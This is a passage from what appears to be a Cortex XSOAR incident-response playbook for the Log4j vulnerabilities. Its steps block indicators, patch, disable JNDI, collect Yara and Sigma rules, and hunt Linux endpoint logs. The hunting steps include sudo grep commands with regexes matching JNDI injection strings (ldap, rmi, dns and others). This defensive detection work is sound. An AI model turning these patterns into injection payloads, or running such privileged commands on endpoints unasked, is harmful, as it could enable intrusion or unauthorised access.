          "x": 1230,
          "y": 110
        }
      }
  "37":
    continueonerrortype: ""
    id: "37"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "87"
      - "74"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: f8730db6-afab-430b-81fa-8de6225a3aaa
      iscommand: false
      name: Hunt Using Cortex XDR
      type: title
      version: -1
    taskid: f8730db6-afab-430b-81fa-8de6225a3aaa
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1220,
          "y": 1410
        }
      }
  "38":
    continueonerrortype: ""
    id: "38"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 0
      scriptArguments:
        AutoCommit:
          simple: "No"
        CustomBlockRule:
          simple: "True"
        CustomURLCategory:
          simple: Demisto Remediation - Malicious URLs
        IP:
          complex:
            accessor: IP
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        MD5:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "32"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        SHA256:
          complex:
            filters:
            - - left:
                  iscontext: true
                  value:
                    simple: ExtractedIndicators.File
                operator: stringHasLength
                right:
                  value:
                    simple: "64"
            root: ExtractedIndicators.File
            transformers:
            - operator: uniq
        URL:
          complex:
            accessor: URL
            root: ExtractedIndicators
            transformers:
            - operator: uniq
        URLListName:
          simple: Demisto Remediation - URL EDL
      wait: 1
    nexttasks:
      '#none#':
      - "42"
    note: false
    quietmode: 0
    scriptarguments:
      AutoCommit:
        simple: "No"
      CustomBlockRule:
        simple: "True"
      CustomURLCategory:
        simple: Demisto Remediation - Malicious URLs
      IP:
        complex:
          accessor: IP
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      MD5:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
              operator: stringHasLength
              right:
                value:
                  simple: "32"
          root: ExtractedIndicators.File
          transformers:
          - operator: uniq
      SHA256:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.File
              operator: stringHasLength
              right:
                value:
                  simple: "64"
          root: ExtractedIndicators.File
          transformers:
          - operator: uniq
      URL:
        complex:
          accessor: URL
          root: ExtractedIndicators
          transformers:
          - operator: uniq
      URLListName:
        simple: Demisto Remediation - URL EDL
      Username:
        complex:
          accessor: Indicator
          filters:
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: DBotScore.Type
              operator: isEqualString
              right:
                value:
                  simple: username
          - - left:
                iscontext: true
                value:
                  simple: DBotScore.Score
              operator: greaterThanOrEqual
              right:
                value:
                  simple: "3"
          root: DBotScore
    separatecontext: true
    skipunavailable: false
    task:
      brand: ""
      description: |+
        This playbook blocks malicious Indicators using all integrations that are enabled, using the following sub-playbooks:

        - Block URL - Generic
        - Block Account - Generic
        - Block IP - Generic v2
        - Block File - Generic v2
        - Block Email - Generic
        - Block Domain - Generic

      id: 769c3914-e327-4820-8ab3-96c23dae8479
      iscommand: false
      name: Block Indicators - Generic v2
      playbookId: Block Indicators - Generic v2
      type: playbook
      version: -1
    taskid: 769c3914-e327-4820-8ab3-96c23dae8479
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 2970
        }
      }
  "39":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.BlockIndicatorsAutomatically
          operator: isEqualString
          right:
            value:
              simple: "True"
      label: "yes"
    continueonerrortype: ""
    id: "39"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "40"
      "yes":
      - "41"
      - "38"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether IOCs associated with the incident can be blocked
        automatically.
      id: 88b11fad-a713-40c6-8c30-0f9f575e8c76
      iscommand: false
      name: Block indicators automatically?
      type: condition
      version: -1
    taskid: 88b11fad-a713-40c6-8c30-0f9f575e8c76
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 2750
        }
      }
  "40":
    continueonerrortype: ""
    id: "40"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "42"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Manually block the IOCs in the relevant systems.
      id: 8e53b517-427c-4be9-8f65-07737397a4e0
      iscommand: false
      name: Block indicators manually
      type: regular
      version: -1
    taskid: 8e53b517-427c-4be9-8f65-07737397a4e0
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1610,
          "y": 2970
        }
      }
  "41":
    continueonerrortype: ""
    id: "41"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        AutoCommit:
          simple: "No"
        Domain:
          complex:
            accessor: Domain
            root: ExtractedIndicators
        DomainListName:
          complex:
            root: inputs.EDLDomainBlocklist
        pre-post-rulebase:
          simple: pre-rulebase
      wait: 1
    nexttasks:
      '#none#':
      - "42"
    note: false
    quietmode: 0
    scriptarguments:
      AutoCommit:
        simple: "No"
      Domain:
        complex:
          accessor: Domain
          root: ExtractedIndicators
      DomainListName:
        complex:
          root: inputs.EDLDomainBlocklist
      pre-post-rulebase:
        simple: pre-rulebase
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: |-
        This playbook blocks Domains using Palo Alto Networks Panorama or Firewall External Dynamic Lists.
        It checks if the EDL configuration is in place with the 'PAN-OS EDL Setup' sub-playbook
        (otherwise the list will be configured), and adds the input Domains to the relevant lists.
      id: 98af40fa-d363-4d8e-890d-288ba8b23d09
      iscommand: false
      name: PAN-OS - Block Domain - External Dynamic List
      playbookId: PAN-OS - Block Domain - External Dynamic List
      type: playbook
      version: -1
    taskid: 98af40fa-d363-4d8e-890d-288ba8b23d09
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 710,
          "y": 2970
        }
      }
  "42":
    continueonerrortype: ""
    id: "42"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "50"
      - "52"
      - "53"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 77316765-90ca-44a8-8bbd-6e0e7251f58f
      iscommand: false
      name: Mitigation
      type: title
      version: -1
    taskid: 77316765-90ca-44a8-8bbd-6e0e7251f58f
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1160,
          "y": 3260
        }
      }
  "43":
    continueonerrortype: ""
    id: "43"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        For CVE-2021-45046 and CVE-2021-44228, please patch with one of the following versions:
        **log4j-2.15.0-rc2**
        **log4j-2.16.0**

        For CVE-2021-45105, please patch with the following version:
        **Log4j 2.17.0 (Java 8)**

        The files are available via the following link:
        [Download Apache Log4j 2](https://logging.apache.org/log4j/2.x/download.html)
      id: 921658e0-5157-4358-8a40-1ee0f8723469
      iscommand: false
      name: Install log4j patched versions
      type: regular
      version: -1
    taskid: 921658e0-5157-4358-8a40-1ee0f8723469
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1410,
          "y": 3560
        }
      }
  "44":
    continueonerrortype: ""
    id: "44"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: "To disable JNDI lookup on vulnerable servers - \n* Remove the
        JndiLookup file in the log4j-core and restart the service\n  * Setup log4j2.formatMsgNoLookups=true\n\nTo
        disable JNDI on vulnerable servers -\n* Set up spring.jndi.ignore=true"
      id: 213b8064-b297-4c57-8083-c4b7786a5042
      iscommand: false
      name: Disable JNDI and JNDI lookup
      type: regular
      version: -1
    taskid: 213b8064-b297-4c57-8083-c4b7786a5042
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1880,
          "y": 3560
        }
      }
  "45":
    continueonerrortype: ""
    id: "45"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    message:
      bcc: null
      body:
        simple: Do you need to continue with the investigation?
      cc: null
      format: ""
      methods: []
      replyOptions:
      - "Yes"
      - "No"
      subject: null
      timings:
        completeafterreplies: 1
        completeaftersla: false
        completeafterv2: false
        retriescount: 2
        retriesinterval: 360
      to: null
    nexttasks:
      "No":
      - "48"
      "Yes":
      - "47"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Check with the analyst whether to continue with the investigation.
      id: 220b1e2d-cee6-4d7f-85a0-e5e3fb2de522
      iscommand: false
      name: Analysis resolution - Should continue with the investigation?
      type: condition
      version: -1
    taskid: 220b1e2d-cee6-4d7f-85a0-e5e3fb2de522
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 3910
        }
      }
  "46":
    continueonerrortype: ""
    id: "46"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 5003840f-0133-4552-8e66-37d10587166e
      iscommand: false
      name: Done
      type: title
      version: -1
    taskid: 5003840f-0133-4552-8e66-37d10587166e
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 4370
        }
      }
  "47":
    continueonerrortype: ""
    id: "47"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "46"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Manual step for further incident investigation. CISA released an
        open-source detection and scanning tool for discovering and fuzzing for Log4J
        RCE CVE-2021-44228 vulnerability. For more information , [CISA GitHub](https://github.com/cisagov/log4j-scanner/tree/master/log4-scanner)
      id: 7cd5e905-eeab-448e-89f8-9864fe0e89c9
      iscommand: false
      name: Investigate Further
      type: regular
      version: -1
    taskid: 7cd5e905-eeab-448e-89f8-9864fe0e89c9
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 680,
          "y": 4160
        }
      }
  "48":
    continueonerrortype: ""
    id: "48"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "46"
    note: false
    quietmode: 0
    scriptarguments:
      closeReason:
        simple: No further actions are required.
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: Close the current incident
      id: 6b4e3400-6aaf-4989-8b6c-853786ee774a
      iscommand: true
      name: Close Investigation
      script: Builtin|||closeInvestigation
      type: regular
      version: -1
    taskid: 6b4e3400-6aaf-4989-8b6c-853786ee774a
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 4160
        }
      }
  "49":
    continueonerrortype: ""
    id: "49"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "45"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: e15d50db-b1c6-4599-89f6-e10dbd512f3f
      iscommand: false
      name: Resolution
      type: title
      version: -1
    taskid: e15d50db-b1c6-4599-89f6-e10dbd512f3f
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1130,
          "y": 3750
        }
      }
  "50":
    continueonerrortype: ""
    id: "50"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "51"
      - "44"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 9cd8bcae-5caf-49fb-8d46-3416c4ae3825
      iscommand: false
      name: Unit42 Recommended Mitigations
      type: title
      version: -1
    taskid: 9cd8bcae-5caf-49fb-8d46-3416c4ae3825
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 2110,
          "y": 3410
        }
      }
  "51":
    continueonerrortype: ""
    id: "51"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Disable suspicious outbound traffic, such as LDAP and RMI on the
        server in PANW Firewall.
      id: 04cb8ec2-4103-477e-8bc0-aa90b491e4fd
      iscommand: false
      name: PANW - Disable suspicious outbound traffic
      type: regular
      version: -1
    taskid: 04cb8ec2-4103-477e-8bc0-aa90b491e4fd
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2340,
          "y": 3560
        }
      }
  "52":
    continueonerrortype: ""
    id: "52"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "43"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: cda9de79-a43f-486d-89da-7959df2e8496
      iscommand: false
      name: Patch Vulnerability
      type: title
      version: -1
    taskid: cda9de79-a43f-486d-89da-7959df2e8496
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1410,
          "y": 3410
        }
      }
  "53":
    continueonerrortype: ""
    id: "53"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "54"
      - "55"
      - "64"
      - "65"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 577bdb6e-eccc-4d6d-8264-ca30550d0695
      iscommand: false
      name: Deploy Detection Rules
      type: title
      version: -1
    taskid: 577bdb6e-eccc-4d6d-8264-ca30550d0695
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 210,
          "y": 3410
        }
      }
  "54":
    continueonerrortype: ""
    id: "54"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Snort rules file has been downloaded as emerging-exploit-snort.rules and is available for download directly from XSOAR.
        Please note the log4j rules are part of the latest released package.
      id: b331fb91-6db6-48f9-8e2d-ab6f8e94b9bb
      iscommand: false
      name: Snort Rules
      type: regular
      version: -1
    taskid: b331fb91-6db6-48f9-8e2d-ab6f8e94b9bb
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 430,
          "y": 3560
        }
      }
  "55":
    continueonerrortype: ""
    id: "55"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Suricata rules file has been downloaded as emerging-exploit-suricata.rules and is available for download directly from XSOAR.
        Please note the log4j rules are part of the latest released package.
      id: 59a6daf6-f392-4486-881e-d17da241dcb1
      iscommand: false
      name: Suricata Rules
      type: regular
      version: -1
    taskid: 59a6daf6-f392-4486-881e-d17da241dcb1
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 870,
          "y": 3560
        }
      }
  "57":
    continueonerror: true
    continueonerrortype: ""
    id: "57"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "15"
    note: false
    quietmode: 0
    scriptarguments:
      retry-count:
        simple: "3"
      retry-interval:
        simple: "2"
      tags:
        simple: CVE-2021-44228
      type:
        simple: IP
      value:
        complex:
          filters:
          - - left:
                iscontext: true
                value:
                  simple: ExtractedIndicators.IP
              operator: isNotEmpty
          root: ExtractedIndicators.IP
          transformers:
          - operator: uniq
      verdict:
        complex:
          root: inputs.CollectedIndicatorsSeverity
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.new.indicator
      id: 2084fa59-ce24-49be-8e36-fe97ce818b63
      iscommand: true
      name: Tag IP indicators
      script: Builtin|||createNewIndicator
      type: regular
      version: -1
    taskid: 2084fa59-ce24-49be-8e36-fe97ce818b63
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1010,
          "y": -270
        }
      }
  "58":
    continueonerror: true
    continueonerrortype: ""
    id: "58"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "15"
    note: false
    quietmode: 0
    scriptarguments:
      retry-count:
        simple: "3"
      retry-interval:
        simple: "2"
      tags:
        simple: Log4j
      type:
        simple: CVE
      value:
        complex:
          root: inputs.RelatedCVEs
          transformers:
          - args:
              delimiter:
                value:
                  simple: ', '
            operator: split
    separatecontext: false
    skipunavailable: false
    task:
      brand: Builtin
      description: commands.local.cmd.new.indicator
      id: aedc8c37-ff9f-49af-8557-5e6a0ed01144
      iscommand: true
      name: Tag CVE indicators
      script: Builtin|||createNewIndicator
      type: regular
      version: -1
    taskid: aedc8c37-ff9f-49af-8557-5e6a0ed01144
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 1450,
          "y": -270
        }
      }
  "60":
    continueonerrortype: ""
    id: "60"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 0
      wait: 1
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    scriptarguments:
      interval:
        simple: "1"
      query_expression:
        complex:
          root: QRadarQuery
      timeout:
        simple: "600"
    separatecontext: true
    skipunavailable: true
    task:
      brand: ""
      description: This playbook runs a QRadar query and return its results to the
        context.
      id: fecb535f-1431-4f2d-8bb0-13211aac0777
      iscommand: false
      name: QRadarFullSearch
      playbookId: QRadarFullSearch
      type: playbook
      version: -1
    taskid: fecb535f-1431-4f2d-8bb0-13211aac0777
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": -550,
          "y": 1100
        }
      }
  "62":
    continueonerrortype: ""
    id: "62"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: YaraRules.yar
      method:
        simple: GET
      proxy:
        simple: "true"
      saveAsFile:
        simple: "yes"
      url:
        simple: https://raw.githubusercontent.com/Neo23x0/signature-base/master/yara/expl_log4j_cve_2021_44228.yar
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: Download Yara Rules
      id: b4650dad-cb06-45ac-8e3d-4bb03fafc8dd
      iscommand: false
      name: Download Yara Rules
      script: http
      type: regular
      version: -1
    taskid: b4650dad-cb06-45ac-8e3d-4bb03fafc8dd
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 310,
          "y": -980
        }
      }
  "63":
    continueonerrortype: ""
    id: "63"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "8"
    note: false
    quietmode: 0
    scriptarguments:
      filename:
        simple: SigmaRules.yml
      method:
        simple: GET
      proxy:
        simple: "true"
      saveAsFile:
        simple: "yes"
      url:
        simple: https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/web/web_cve_2021_44228_log4j_fields.yml
    separatecontext: false
    skipunavailable: true
    task:
      brand: ""
      description: Download Sigma Rules
      id: 5f9d7428-80f1-4316-8467-dd13bd391f6a
      iscommand: false
      name: Download Sigma Rules
      script: http
      type: regular
      version: -1
    taskid: 5f9d7428-80f1-4316-8467-dd13bd391f6a
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 770,
          "y": -980
        }
      }
  "64":
    continueonerrortype: ""
    id: "64"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Sigma rules file has been downloaded as SigmaRules.yml and is available
        for download directly from XSOAR.
      id: 3de3123e-35ea-42f5-860c-f703d4af7f2d
      iscommand: false
      name: Sigma Rules
      type: regular
      version: -1
    taskid: 3de3123e-35ea-42f5-860c-f703d4af7f2d
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -10,
          "y": 3560
        }
      }
  "65":
    continueonerrortype: ""
    id: "65"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "49"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Yara rules file has been downloaded asYaraRules.yar and is available
        for download directly from XSOAR.
      id: d6a04868-06da-4259-851d-e4f4a0b14e84
      iscommand: false
      name: Yara Rules
      type: regular
      version: -1
    taskid: d6a04868-06da-4259-851d-e4f4a0b14e84
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -450,
          "y": 3560
        }
      }
  "66":
    continueonerrortype: ""
    id: "66"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "7"
      - "6"
      - "63"
      - "62"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 62c29297-4d25-436d-8db9-e0b264772610
      iscommand: false
      name: Collect Detection Rules
      type: title
      version: -1
    taskid: 62c29297-4d25-436d-8db9-e0b264772610
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 770,
          "y": -1130
        }
      }
  "69":
    continueonerrortype: ""
    id: "69"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      "no":
      - "29"
      "yes":
      - "32"
    note: false
    quietmode: 0
    scriptarguments:
      brandname:
        simple: Cortex XDR - IR
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Returns 'yes' if integration brand is available. Otherwise returns
        'no'
      id: 0cafeab0-3625-40dc-8f5d-6a14949d9e1a
      iscommand: false
      name: Check if Cortex XDR - IR is Enabled
      script: IsIntegrationAvailable
      type: condition
      version: -1
    taskid: 0cafeab0-3625-40dc-8f5d-6a14949d9e1a
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 1520,
          "y": 1730
        }
      }
  "70":
    continueonerror: true
    continueonerrortype: ""
    id: "70"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "71"
      - "73"
    note: false
    quietmode: 0
    scriptarguments:
      platform:
        simple: linux
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Gets a list of endpoints, according to the passed filters. If there
        are no filters, all endpoints are returned. Filtering by multiple fields will
        be concatenated using AND condition (OR is not supported). Maximum result
        set size is 100. Offset is the zero-based number of endpoint from the start
        of the result set (start by counting from 0).
      id: 7b21bea9-4e3f-40ab-83d1-be070d150f84
      iscommand: true
      name: Retrieve All Endpoint IDs
      script: '|||xdr-get-endpoints'
      type: regular
      version: -1
    taskid: 7b21bea9-4e3f-40ab-83d1-be070d150f84
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2000,
          "y": 2245
        }
      }
  "71":
    continueonerrortype: ""
    id: "71"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        commands:
          simple: pwd
        endpoint_ids:
          complex:
            accessor: endpoint_id
            filters:
            - - ignorecase: true
                left:
                  iscontext: true
                  value:
                    simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                operator: isEqualString
                right:
                  value:
                    simple: CONNECTED
            root: PaloAltoNetworksXDR.Endpoint
        polling_timeout:
          simple: "10"
      wait: 1
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 0
    scriptarguments:
      commands:
        simple: sudo egrep -i -r '\$\{jndi:(ldap[s]?|rmi|dns|corba|iiop|nis|nds):/[^\n]+'
      endpoint_ids:
        complex:
          accessor: endpoint_id
          filters:
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
              operator: isEqualString
              right:
                value:
                  simple: CONNECTED
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.os_type
              operator: isEqualString
              right:
                value:
                  simple: AGENT_OS_LINUX
          root: PaloAltoNetworksXDR.Endpoint
      polling_timeout:
        simple: "5"
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Initiates a new script execution of shell commands.
      id: 25819cec-74f8-4667-8beb-fc07692cbf20
      iscommand: false
      name: Hunt /var/log for exploitation patterns - Uncompressed
      playbookId: Cortex XDR - Execute commands
      type: playbook
      version: -1
    taskid: 25819cec-74f8-4667-8beb-fc07692cbf20
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 2000,
          "y": 2440
        }
      }
  "72":
    continueonerrortype: ""
    id: "72"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "71"
      - "73"
    note: false
    quietmode: 0
    scriptarguments:
      endpoint_id_list:
        complex:
          root: inputs.XDREndpointIDs
      platform:
        simple: linux
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Gets a list of endpoints, according to the passed filters. If there
        are no filters, all endpoints are returned. Filtering by multiple fields will
        be concatenated using AND condition (OR is not supported). Maximum result
        set size is 100. Offset is the zero-based number of endpoint from the start
        of the result set (start by counting from 0).
      id: 5f3ee460-e3e5-4ed8-8e47-730c1b383d48
      iscommand: true
      name: Retrieve specified endpoint IDs
      script: '|||xdr-get-endpoints'
      type: regular
      version: -1
    taskid: 5f3ee460-e3e5-4ed8-8e47-730c1b383d48
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2450,
          "y": 2245
        }
      }
  "73":
    continueonerrortype: ""
    id: "73"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    loop:
      exitCondition: ""
      iscommand: false
      max: 100
      scriptArguments:
        commands:
          simple: pwd
        endpoint_ids:
          complex:
            accessor: endpoint_id
            filters:
            - - ignorecase: true
                left:
                  iscontext: true
                  value:
                    simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
                operator: isEqualString
                right:
                  value:
                    simple: CONNECTED
            root: PaloAltoNetworksXDR.Endpoint
        polling_timeout:
          simple: "10"
      wait: 1
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 0
    scriptarguments:
      commands:
        simple: sudo find /var/log -name \*.gz -print0 | xargs -0 zgrep -E -i '\$\{jndi:(ldap[s]?|rmi|dns|corba|iiop|nis|nds):/[^\n]+'
      endpoint_ids:
        complex:
          accessor: endpoint_id
          filters:
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.endpoint_status
              operator: isEqualString
              right:
                value:
                  simple: CONNECTED
          - - ignorecase: true
              left:
                iscontext: true
                value:
                  simple: PaloAltoNetworksXDR.Endpoint.os_type
              operator: isEqualString
              right:
                value:
                  simple: AGENT_OS_LINUX
          root: PaloAltoNetworksXDR.Endpoint
      polling_timeout:
        simple: "5"
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Initiates a new script execution of shell commands.
      id: 5752d90a-507c-4484-8eff-2d7973fa14f0
      iscommand: false
      name: Hunt /var/log for exploitation patterns - Compressed
      playbookId: Cortex XDR - Execute commands
      type: playbook
      version: -1
    taskid: 5752d90a-507c-4484-8eff-2d7973fa14f0
    timertriggers: []
    type: playbook
    view: |-
      {
        "position": {
          "x": 2450,
          "y": 2440
        }
      }
  "74":
    continueonerrortype: ""
    id: "74"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "75"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 2da77c2e-26c3-4f24-855c-3a61a34ca1ef
      iscommand: false
      name: 'Cortex XDR - XQL Hunting Queries '
      type: title
      version: -1
    taskid: 2da77c2e-26c3-4f24-855c-3a61a34ca1ef
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 900,
          "y": 1570
        }
      }
  "75":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                root: inputs.RunXQLHuntingQueries
          operator: isEqualString
          right:
            value:
              simple: "True"
      label: "yes"
    continueonerrortype: ""
    id: "75"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "29"
      "yes":
      - "80"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks whether to execute XDR shell script for exploitation hunting.
      id: efa0c7f7-3f8b-4cf8-8dc7-27accb6e4b14
      iscommand: false
      name: Should run XQL hunting queries?
      type: condition
      version: -1
    taskid: efa0c7f7-3f8b-4cf8-8dc7-27accb6e4b14
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 900,
          "y": 1730
        }
      }
  "77":
    continueonerrortype: ""
    id: "77"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=30d |
          dataset = xdr_data

          | filter actor_process_image_name contains "java"

          | filter (agent_os_sub_type contains "server" or agent_os_type = ENUM.AGENT_OS_LINUX )

          | filter action_file_name contains "log4j" and action_file_extension = "jar" // testing

          |fields agent_hostname, agent_ip_addresses, actor_effective_username, action_file_name, action_file_path

          | dedup agent_hostname

          | join conflict_strategy = left type=left

          (

          dataset = xdr_data

